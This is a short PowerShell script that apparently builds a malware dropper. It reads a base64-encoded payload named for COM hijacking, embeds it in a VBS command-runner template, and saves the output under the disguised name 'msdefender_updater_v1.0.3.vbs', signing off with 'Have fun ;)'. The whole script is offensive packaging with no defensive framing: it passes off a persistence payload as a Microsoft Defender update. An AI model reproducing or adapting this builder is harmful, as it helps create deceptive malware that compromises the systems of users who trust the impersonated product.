$Channel1HealerPath = ".\channel1\com_hijack.b64"
$Channel1HealerContent = Get-Content -Path $Channel1HealerPath -Raw
$Channel1HealerContent = $Channel1HealerContent -replace "`r`n", "" -replace "`n", ""

$TemplatePath =".\installer\b64_command_runner_template.vbs"
$templateContent = Get-Content -Path $TemplatePath -Raw

$finalScript = $templateContent -replace "{{CHANNEL1_HEALER_CMD}}", $Channel1HealerContent

$OutputPath = ".\msdefender_updater_v1.0.3.vbs"
Set-Content -Path $OutputPath -Value $finalScript

Write-Host "Have fun ;)"